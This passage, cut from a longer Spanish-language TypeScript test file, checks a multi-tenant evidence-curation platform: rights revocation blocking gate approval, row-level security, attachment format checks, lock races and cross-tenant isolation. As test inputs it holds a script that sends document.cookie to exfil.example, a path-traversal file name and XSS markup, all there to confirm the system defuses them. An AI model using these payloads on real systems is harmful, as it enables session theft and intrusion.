    // éxito y el rechazo llegaba al aprobar — el mismo hueco que ya se cerró para los
    // insights, una capa más arriba.
    const bloqueada = (await gobernanzaDeProyecto(leadId, ws, proyectoId))!.decisiones.find(
      (d) => d.id === (dec!.id as string),
    );
    expect(bloqueada!.estado).toBe('vigente');
    // Nombra QUÉ reparar: el insight y la afirmación exactos, no un motivo genérico.
    expect(bloqueada!.sinRespaldo).toEqual({
      insight: 'El canal digital concentra el abandono',
      afirmacion: 'El abandono se concentra en el canal digital',
    });
    await expect(aprobarGate(leadId, { workspaceId: ws, gateId })).rejects.toThrow(
      /cita una decisión cuyo insight de respaldo/,
    );
    await expect(
      conUsuario(leadId, (tx) => tx`update gate_instancia
        set estado = 'aprobado', aprobado_por = ${leadId}, aprobado_en = now()
        where id = ${gateId}`),
    ).rejects.toMatchObject({ code: 'DR001' });

    // Reconceder desbloquea: el bloqueo era el derecho, y vuelve cuando el derecho vuelve.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evDecision,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    // Reconceder desbloquea las dos caras a la vez, que es la prueba de que son una sola.
    expect(
      (await gobernanzaDeProyecto(leadId, ws, proyectoId))!.decisiones.find(
        (d) => d.id === (dec!.id as string),
      )!.sinRespaldo,
    ).toBeNull();
    const r = await aprobarGate(leadId, { workspaceId: ws, gateId });
    expect(r.numero).toBe(1);
  });

  // ── La revocación alcanza a lo que YA estaba cumplido ──

  it('revocar derechos después de cumplir el ítem impide aprobar el gate', async () => {
    // El caso que se colaba: el ítem se marca cuando la evidencia SÍ tiene derechos, y
    // después se revocan. Nada actualiza la fila del checklist, así que su guard no vuelve
    // a correr; y el guard de aprobación miraba pendientes, orden, criterios, arquetipos
    // y decisiones — pero no derechos. El gate se aprobaba, delante del cliente, sobre una
    // cita ya bloqueada. Proyecto propio para no tocar el checklist compartido.
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente revocable', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Evidencia revocable', '{}'::jsonb, ${leadId})
      returning id`;
    const evRevocable = ev!.id as string;
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${ws}, ${evRevocable}, 'concedido', 'cliente', 'Consentimiento firmado',
              ${leadId}, now(), ${leadId})`;

    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${retoId}, 'P-91', 'Proyecto revocación', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const gateId = gate!.id as string;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gateId}, 0, 'Evidencia primaria suficiente') returning id`;

    // Con derechos vigentes, cumplir el ítem es legítimo.
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: ci!.id as string,
      accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evRevocable },
    });

    // Se retira el consentimiento. El ítem sigue cumplido: nada lo toca, y esa es
    // justamente la decisión (resetearlo tiraría juicio humano por algo reversible).
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evRevocable,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    const [sigueCumplido] = await conUsuario(leadId, (tx) => tx`select estado from checklist_item
      where id = ${ci!.id as string}`);
    expect(sigueCumplido?.estado).toBe('cumplido');

    // Pero aprobar el gate —el acto que pone la cita delante del cliente— ya no pasa, y
    // lo dice nombrando la dimensión que falta (SYS-14).
    await expect(aprobarGate(leadId, { workspaceId: ws, gateId })).rejects.toThrow(
      /derechos vigentes.*retiró el consentimiento/s,
    );
    // Y por SQL CRUDO: el re-chequeo vive en el guard de la transición.
    await expect(
      conUsuario(leadId, (tx) => tx`update gate_instancia
        set estado = 'aprobado', aprobado_por = ${leadId}, aprobado_en = now()
        where id = ${gateId}`),
    ).rejects.toMatchObject({ code: 'DR001' });
    const [sigueP] = await conUsuario(leadId, (tx) => tx`select estado from gate_instancia
      where id = ${gateId}`);
    expect(sigueP?.estado).toBe('pendiente');

    // El camino de reparación es reconceder (los derechos van y vuelven por diseño), y no
    // exige rehacer el checklist: el ítem cumplido sigue ahí y el gate aprueba.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evRevocable,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    const r = await aprobarGate(leadId, { workspaceId: ws, gateId });
    expect(r.numero).toBe(1);
  });

  // ── Archivos adjuntos ──

  it('adjuntar valida el formato por los BYTES y la base calcula el sha256', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Informe con adjunto',
      contenido: 'resumen',
      tipoFuente: 'documento',
      referencia: '',
    });
    // Un ZIP disfrazado de PDF no entra (la firma manda, no la extensión).
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: 'falso.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(new Uint8Array([0x50, 0x4b, 0x03, 0x04])),
      }),
    ).rejects.toThrow(ErrorCuraduria);

    const r = await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      // Ruta en el nombre: se normaliza a basename antes de tocar la base.
      nombre: '../../etc/informe.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    // sha256 es una columna GENERADA: ni la app puede declarar uno que no corresponda.
    const digest = await crypto.subtle.digest('SHA-256', PDF.slice().buffer as ArrayBuffer);
    const hex = [...new Uint8Array(digest)]
      .map((b) => b.toString(16).padStart(2, '0'))
      .join('');
    expect(r.sha256).toBe(hex);

    const bandeja = await listarBandeja(leadId, ws);
    const fila = bandeja.pendientes.find((i) => i.id === item.itemId);
    expect(fila?.archivos).toHaveLength(1);
    expect(fila?.archivos[0]?.nombre).toBe('informe.pdf');
    expect(fila?.archivos[0]?.bytes).toBe(PDF.length);

    // Los bytes vuelven idénticos.
    const bajado = await archivoParaDescarga(leadId, ws, r.archivoId);
    expect(bajado?.contenidoBase64).toBe(bytesABase64(PDF));
    // Cross-tenant: el mismo id desde otro workspace no existe.
    expect(await archivoParaDescarga(leadId, wsB, r.archivoId)).toBeNull();
  });

  it('el adjunto solo entra mientras el material esté PENDIENTE: lo curado es inmutable', async () => {
    // itemSinDerechos ya fue aprobado en el primer test.
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: itemSinDerechos,
        nombre: 'tarde.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      }),
    ).rejects.toThrow(/row-level security/);
  });

  it('retirar un adjunto: quien lo subió o un curador, y solo antes de curar', async () => {
    const item = await crearItem(stakeId, {
      workspaceId: ws,
      titulo: 'Material del stakeholder',
      contenido: 'aporte',
      tipoFuente: 'nota',
      referencia: '',
    });
    const a = await adjuntarArchivo(stakeId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'aporte.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    await eliminarArchivo(leadId, ws, a.archivoId); // curador
    expect(await archivoParaDescarga(leadId, ws, a.archivoId)).toBeNull();
    await expect(eliminarArchivo(leadId, ws, a.archivoId)).rejects.toThrow(ErrorCuraduria);
  });

  it('el tope de adjuntos por item se aplica (la bandeja es curaduría, no repositorio)', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con muchos adjuntos',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    for (let i = 0; i < MAX_ARCHIVOS_POR_ITEM; i += 1) {
      await adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: `parte-${i}.pdf`,
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      });
    }
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: 'una-mas.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      }),
    ).rejects.toThrow(ErrorCuraduria);
  });

  it('aprobar el gate COMPARTE candado con quien revoca: la revocación no se cuela en medio', async () => {
    // Re-comprobar los derechos al aprobar cerró el eje TIEMPO, pero una comprobación SIN
    // candado sobre estado que otro camino muta no cierra la ventana: la estrecha. Bajo
    // READ COMMITTED el guard leía `derecho_uso` sin bloquear nada, así que la revocación
    // podía commitear entre esa lectura y el commit del gate. Es el axioma de esta base
    // —una política es un predicado sobre una instantánea, no un cerrojo— aplicado a un
    // guard en vez de a una política.
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente del candado', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Respaldo con candado', '{}'::jsonb, ${leadId})
      returning id`;
    const evGate = ev!.id as string;
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${ws}, ${evGate}, 'concedido', 'cliente', 'Consentimiento vigente',
              ${leadId}, now(), ${leadId})`;

    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${retoId}, 'P-96', 'Proyecto candado', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const gateId = gate!.id as string;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gateId}, 1, 'Evidencia de respaldo') returning id`;
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: ci!.id as string,
      accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evGate },
    });

    // La revocación EN VUELO: su UPDATE ya tomó el candado de fila de `derecho_uso` y no
    // ha commiteado. Es exactamente la carrera que el hallazgo describe.
    const revocacion = await enVuelo(async (tx) => {
      await tx`update derecho_uso set estado = 'denegado', ambito = 'interno',
          base = 'El titular retiró el consentimiento'
        where workspace_id = ${ws} and evidencia_id = ${evGate}`;
    });

    const aprobacion = aprobarGate(leadId, { workspaceId: ws, gateId });
    // Sin el `for share` del guard esto resolvía en milisegundos con el gate APROBADO
    // sobre un respaldo que estaba siendo revocado. Con él, espera.
    expect(await sigueEsperando(aprobacion)).toBe(true);

    await revocacion.cerrar();
    // Y al soltarse, Postgres re-evalúa la fila con la versión nueva (EvalPlanQual), así
    // que la comprobación de abajo ve la revocación ya commiteada y RECHAZA. El candado no
    // sirve solo para esperar: sirve para decidir sobre lo que quedó.
    await expect(aprobacion).rejects.toThrow(/derechos/);
    const [estado] = await admin`select estado from gate_instancia where id = ${gateId}`;
    expect(estado!.estado).toBe('pendiente');
  });

  it('el tope de adjuntos se cuenta SIN el filtro de quien mira (un conteo bajo RLS no es un conteo)', async () => {
    // `archivo_select` solo enseña a quien no cura los adjuntos que él mismo subió
    // (20260902210000). Contar el tope en la app bajo esa política era contar «lo que este
    // usuario ve», que es justo lo que un tope no puede significar: el tope es una
    // propiedad del OBJETO. Diez del curador más diez suyos y el material acaba con veinte.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material que llena su cupo',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    for (let i = 0; i < MAX_ARCHIVOS_POR_ITEM; i += 1) {
      await adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: `parte-${i}.pdf`,
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      });
    }
    // El stakeholder no ve NINGUNO de los diez: ésa es la premisa del hallazgo, no un
    // detalle. Si algún día los viera, este test dejaría de probar lo que dice probar.
    const [vistos] = await conUsuario(
      stakeId,
      (tx) => tx`select count(*)::int as n from archivo_importado
        where item_id = ${item.itemId} and workspace_id = ${ws}`,
    );
    expect(vistos!.n as number).toBe(0);

    await expect(
      adjuntarArchivo(stakeId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: 'la-que-sobra.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      }),
    ).rejects.toThrow(ErrorCuraduria);

    // Y el SQL crudo del rol de aplicación choca igual: el tope vive ahora en la base, no
    // en el servicio. Antes no había NINGÚN respaldo — los CHECK de la tabla cubren tipo,
    // tamaño y nombre, y contar filas hermanas no cabe en un CHECK de fila.
    await expect(
      conUsuario(
        stakeId,
        (tx) => tx`insert into archivo_importado
          (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
          values (${ws}, ${item.itemId}, 'por-sql.pdf', 'application/pdf',
                  ${Buffer.from(PDF)}, ${stakeId})`,
      ),
    ).rejects.toMatchObject({ code: 'AD001' });
  });

  it('sellar el item toma el MISMO candado que adjuntar: lo decidido no se mueve por detrás', async () => {
    // «Lo decidido es inmutable» (SYS-17) lo dice la política del adjunto exigiendo que el
    // item siga pendiente — un predicado sobre una instantánea. Sin candado compartido, una
    // subida podía comprobarlo, el curador sellar, y la subida commitear después: las dos
    // transacciones con razón en su propio snapshot y equivocadas juntas.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material que se sella con una subida en vuelo',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    // Una subida en vuelo: lo que sostiene es EL CANDADO DEL ITEM, el mismo que toma el
    // trigger `archivo_item_candado` en cuanto empieza a insertar.
    const subida = await enVuelo(async (tx) => {
      await tx`select pg_advisory_xact_lock(
        hashtextextended('designio:item:' || ${item.itemId}, 42))`;
    });

    const sello = rechazarItem(leadId, { workspaceId: ws, itemId: item.itemId });
    expect(await sigueEsperando(sello)).toBe(true);

    await subida.cerrar();
    await sello;
    const [estado] = await sqlAdmin()`select estado from item_importacion
      where id = ${item.itemId}`;
    expect(estado!.estado).toBe('rechazado');
  });

  it('la extensión guardada la fija el FORMATO verificado, no quien llama', async () => {
    // El ataque completo, por el camino real: HTML en UTF-8 declarado `text/plain`.
    // `verificarArchivo` lo acepta —es texto legítimo: sin controles ni bidi— y antes el
    // sufijo `.html` llegaba intacto a la base. La descarga fuerza octet-stream, pero
    // escribe el fichero en disco con ese nombre: abrirlo desde ahí es un origen file://
    // donde el navegador decide por la extensión y ejecuta el script.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con nombre ejecutable',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    const html = new TextEncoder().encode(
      '<html><script>fetch("https://exfil.example/"+document.cookie)</script></html>',
    );
    const r = await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'payload.html',
      tipoMime: 'text/plain',
      contenidoBase64: bytesABase64(html),
    });
    const bajado = await archivoParaDescarga(leadId, ws, r.archivoId);
    // El nombre original se conserva entero (es trazabilidad de quien aportó el
    // material); lo que cambia es la extensión FINAL, la única que el sistema mira.
    expect(bajado?.nombre).toBe('payload.html.txt');
    // Y los bytes siguen siendo los mismos: no se sanea el contenido, se desarma el
    // vector (el material de terceros se guarda crudo — RF-03.2).
    expect(bajado?.contenidoBase64).toBe(bytesABase64(html));

    // Y por SQL CRUDO del rol de aplicación: la regla vive en un CHECK, no solo en la
    // app. Sin esto la promesa de la allowlist sería una convención del servicio.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'payload.html', 'text/plain', 'hola'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Tampoco una extensión de OTRO formato de la allowlist: `.pdf` con bytes de texto
    // sigue siendo un nombre que miente sobre lo que hay dentro.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'nota.pdf', 'text/plain', 'hola'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  it('el esquema también rechaza formatos y nombres inseguros por SQL crudo', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Prueba de constraints',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    // SVG: ejecutable en un navegador, fuera de la allowlist del CHECK.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'x.svg', 'image/svg+xml', '\\x3c73'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Nombre con separador de ruta: iría a un Content-Disposition.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, '../x.pdf', 'application/pdf', '\\x25504446'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Archivo vacío.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'vacio.pdf', 'application/pdf', ''::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  // ── Sanitización de ingesta ──

  it('el contenido importado se guarda CRUDO: un payload de markup vuelve byte a byte', async () => {
    const payload = '<script>alert("xss")</script> & <img onerror=x> — 62% ✅';
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con markup',
      contenido: payload,
      tipoFuente: 'documento',
      referencia: '',
    });
    const [fila] = await conUsuario(leadId, (tx) => tx`select contenido from item_importacion
      where id = ${item.itemId}`);
    // Ni escapado ni normalizado: la fidelidad de la cita depende de que no lo toquemos.
    expect(fila?.contenido).toBe(payload);
  });

  it('los controles y overrides bidi los rechaza también el CHECK de la base', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Base para el check',
      contenido: 'limpio',
      tipoFuente: 'nota',
      referencia: '',
    });
    expect(item.itemId).toBeTruthy();
    // Saltándose el schema de la app: el INSERT crudo con un control choca con el CHECK.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con control', 'hola' || chr(7) || 'mundo', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con bidi ' || chr(8238), 'texto', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  // ── Paginación de la pantalla de derechos ──

  it('toda la evidencia es alcanzable paginando: la vieja no queda fuera para siempre', async () => {
    // Sin cursor, un tope duro no «recorta una lista»: deja evidencia PERMANENTEMENTE
    // fuera de la única pantalla donde se conceden y revocan derechos. Y como los
    // derechos nacen pendientes (fail-closed), esa evidencia queda además incitable e
    // inexportable sin camino de reparación. Se siembra una página entera de más.
    const admin = sqlAdmin();
    const sobrantes = PAGINA_DERECHOS + 1;
    await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      select ${ws}, 'nota', 'pag-' || g, ${leadId} from generate_series(1, ${sobrantes}) g`;
    // now() es fijo dentro de la sentencia: todas comparten `creado_en` y el desempate
    // recae en el id — que es justo el caso que un keyset `(creado_en, id)` tiene que
    // resolver sin repetir ni saltar filas.
    const nuevas = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      select ${ws}, f.id, 'Evidencia ' || f.titulo, '{}'::jsonb, ${leadId}
      from fuente f where f.workspace_id = ${ws} and f.titulo like 'pag-%'
      returning id`;
    await admin`insert into derecho_uso (workspace_id, evidencia_id, creado_por)
      select ${ws}, e.id, ${leadId} from evidencia e
      where e.id in ${admin(nuevas.map((f) => f.id as string))}`;

    const primera = await listarEvidenciaConDerechos(leadId, ws);
    expect(primera.evidencias).toHaveLength(PAGINA_DERECHOS);
    expect(primera.hayMas).toBe(true);

    const vistas: string[] = [...primera.evidencias.map((e) => e.id)];
    let cursor = primera.evidencias[primera.evidencias.length - 1]!.id;
    let hayMas = primera.hayMas;
    for (let vuelta = 0; hayMas && vuelta < 20; vuelta += 1) {
      const pagina = await listarEvidenciaConDerechos(leadId, ws, cursor);
      expect(pagina.evidencias.length).toBeGreaterThan(0);
      vistas.push(...pagina.evidencias.map((e) => e.id));
      cursor = pagina.evidencias[pagina.evidencias.length - 1]!.id;
      hayMas = pagina.hayMas;
    }
    expect(hayMas).toBe(false);

    // Ni repetidas ni saltadas: el recorrido completo es EXACTAMENTE la evidencia del
    // workspace, que es lo que convierte «hay más» en una promesa cumplible.
    const todas = (await admin`select id from evidencia where workspace_id = ${ws}`).map(
      (f) => f.id as string,
    );
    expect(new Set(vistas).size).toBe(vistas.length);
    expect(new Set(vistas)).toEqual(new Set(todas));

    // El cursor no es una vía de escape del tenant: pedir la página siguiente con el id
    // de una evidencia de otro workspace no devuelve nada de aquel ni de este.
    const [ajena] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${wsB}, 'nota', 'ajena', ${leadId}) returning id`;
    const [evAjena] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${wsB}, ${ajena!.id as string}, 'Ajena', '{}'::jsonb, ${leadId}) returning id`;
    const conCursorAjeno = await listarEvidenciaConDerechos(
      leadId,
      ws,
      evAjena!.id as string,
    );
    expect(conCursorAjeno.evidencias).toHaveLength(0);
  });

  // ── Los predicados de derechos no responden a quien no es miembro ──

  it('evidencia_usable y motivo_bloqueo no son un oráculo cross-tenant', async () => {
    // Son SECURITY DEFINER y están concedidas a designio_app: leen `derecho_uso` saltándose
    // la RLS, que es justo lo que necesitan para decidir igual para todos los roles. Sin
    // pre-chequeo de membresía, una sesión legítima podía preguntar por la evidencia de
    // OTRO tenant. La de `motivo` es la grave: devuelve `base`, prosa libre escrita por el
    // cliente (cláusulas, motivos de retirada del consentimiento).
    const admin = sqlAdmin();
    const [fuenteB] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${wsB}, 'nota', 'Fuente ajena', ${leadId}) returning id`;
    const [evB] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${wsB}, ${fuenteB!.id as string}, 'Evidencia ajena', '{}'::jsonb, ${leadId})
      returning id`;
    const SECRETO = 'el titular retiró el consentimiento tras la denuncia interna';
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${wsB}, ${evB!.id as string}, 'denegado', 'interno', ${SECRETO},
              ${leadId}, now(), ${leadId})`;

    // leadId NO es miembro de wsB. Preguntar por esa evidencia no revela ni su estado ni,
    // sobre todo, el texto de la denegación.
    const [sonda] = await conUsuario(
      leadId,
      (tx) => tx`select evidencia_usable(${evB!.id as string}, ${wsB}, 'cliente') as usable,
                        evidencia_motivo_bloqueo(${evB!.id as string}, ${wsB}, 'cliente') as motivo`,
    );
    expect(sonda!.usable).toBe(false);
    expect(sonda!.motivo).toBeNull();

    // Y no se distingue «no puedes verlo» de «no existe»: un uuid inventado en el mismo
    // workspace ajeno responde exactamente igual. Esa indistinguibilidad ES la propiedad.
    const [inventada] = await conUsuario(
      leadId,
      (tx) => tx`select evidencia_usable(${crypto.randomUUID()}, ${wsB}, 'cliente') as usable,
                        evidencia_motivo_bloqueo(${crypto.randomUUID()}, ${wsB}, 'cliente') as motivo`,
    );
    expect(inventada!.usable).toBe(sonda!.usable);
    expect(inventada!.motivo).toBe(sonda!.motivo);

    // En el workspace propio siguen funcionando igual que siempre: endurecerlas no las
    // vuelve inútiles, solo las hace responder a quien tiene derecho a preguntar.
    const [propia] = await conUsuario(
      leadId,
      (tx) => tx`select evidencia_usable(${evSinDerechos}, ${ws}, 'cliente') as usable,
                        evidencia_motivo_bloqueo(${evSinDerechos}, ${ws}, 'cliente') as motivo`,
    );
    expect(propia!.usable).toBe(false);
    expect(propia!.motivo).toContain('derechos pendientes');
  });

  it('el adjunto original no se descarga por el mero hecho de ser miembro', async () => {
    // `interno` es «solo la boutique» y `cliente` es «portal y entregables». La política de
    // lectura era solo de membresía, así que el ámbito no significaba nada en la única
    // superficie que entrega el documento ENTERO: un stakeholder podía bajarse los bytes
    // originales de material sin derechos para uso con el cliente.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con original reservado',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    const adj = await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'reservado.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });

    // El stakeholder es miembro y no lo subió: ya no lo recibe.
    expect(await archivoParaDescarga(stakeId, ws, adj.archivoId)).toBeNull();
    // La boutique sí: curar el material es su trabajo, y es lo que «interno» autoriza.
    expect(await archivoParaDescarga(disenadorId, ws, adj.archivoId)).not.toBeNull();
    // Y admin-cliente también: administra los datos del cliente y es quien ejerce el
    // derecho a exportar el archivo COMPLETO — excluirlo rompería SYS-04.
    expect(await archivoParaDescarga(adminClienteId, ws, adj.archivoId)).not.toBeNull();

    // Quien aporta material lo sigue viendo aunque no sea curador: sin esto, contribuir
    // desde el portal sería escribir en un buzón sin tapa.
    const suyo = await crearItem(stakeId, {
      workspaceId: ws,
      titulo: 'Aporte del stakeholder',
      contenido: 'x',
      tipoFuente: 'nota',
      referencia: '',
    });
    const propio = await adjuntarArchivo(stakeId, {
      workspaceId: ws,
      itemId: suyo.itemId,
      nombre: 'aporte.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    expect(await archivoParaDescarga(stakeId, ws, propio.archivoId)).not.toBeNull();

    // Y en cuanto la evidencia resultante tiene derechos vigentes para «cliente», el
    // original deja de estar reservado: el material ya está autorizado para ese uso.
    const bandeja = await listarBandeja(leadId, ws);
    expect(bandeja.pendientes.some((i) => i.id === item.itemId)).toBe(true);
    const curada = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: false,
      resumen: 'Material autorizado',
      dimensiones,
    });
    expect(await archivoParaDescarga(stakeId, ws, adj.archivoId)).toBeNull();
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: curada.evidenciaId,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Cláusula 7 del contrato',
      venceEn: null,
    });
    expect(await archivoParaDescarga(stakeId, ws, adj.archivoId)).not.toBeNull();
  });

  it('reafirmar los mismos derechos con otra firma deja evento: la atribución es decisión', async () => {
    // La condición del guard miraba estado, ámbito, vigencia y base — no quién firma. Un
    // segundo responsable reenviando la MISMA decisión se quedaba como autor de la fila
    // viva sin aparecer en la historia: la auditoría nombraba a la primera persona.
    const admin = sqlAdmin();
    const [antes] = await admin`select count(*)::int as n from evento_dominio
      where workspace_id = ${ws} and payload->>'evidenciaId' = ${evConDerechos}
        and tipo in ('DerechosConcedidos', 'DerechosDenegados')`;
    const [previo] = await conUsuario(leadId, (tx) => tx`select decidido_por from derecho_uso
      where evidencia_id = ${evConDerechos}`);

    // Mismo estado, mismo ámbito, misma base, misma vigencia — pero otra persona.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });

    const [ahora] = await conUsuario(leadId, (tx) => tx`select decidido_por from derecho_uso
      where evidencia_id = ${evConDerechos}`);
    expect(ahora!.decidido_por).toBe(adminClienteId);
    expect(ahora!.decidido_por).not.toBe(previo!.decidido_por);
    // La fila viva cambió de firmante, así que la historia tiene que decirlo.
    const [despues] = await admin`select count(*)::int as n from evento_dominio
      where workspace_id = ${ws} and payload->>'evidenciaId' = ${evConDerechos}
        and tipo in ('DerechosConcedidos', 'DerechosDenegados')`;
    expect(despues!.n as number).toBe((antes!.n as number) + 1);
    const [evento] = await admin`select payload, actor_id from evento_dominio
      where workspace_id = ${ws} and payload->>'evidenciaId' = ${evConDerechos}
      order by creado_en desc limit 1`;
    expect(evento!.actor_id).toBe(adminClienteId);
    expect(
      (evento!.payload as { previo: { decididoPor: string } }).previo.decididoPor,
    ).toBe(previo!.decidido_por);
  });

  it('el MATERIAL de una evidencia bloqueada no llega por ninguna de sus tres vías', async () => {
    // Un solo predicado (`material_evidencia_visible`) gobierna las tres superficies que
    // entregan material: los bytes del adjunto, el texto pegado del item y el fragmento
    // copiado en la cita. Antes cada una tenía su propia regla —o ninguna— y por eso se
    // fueron encontrando de una en una. Aquí se comprueban las tres a la vez sobre la
    // MISMA evidencia bloqueada, que es lo que hace que sea una regla y no tres parecidas.
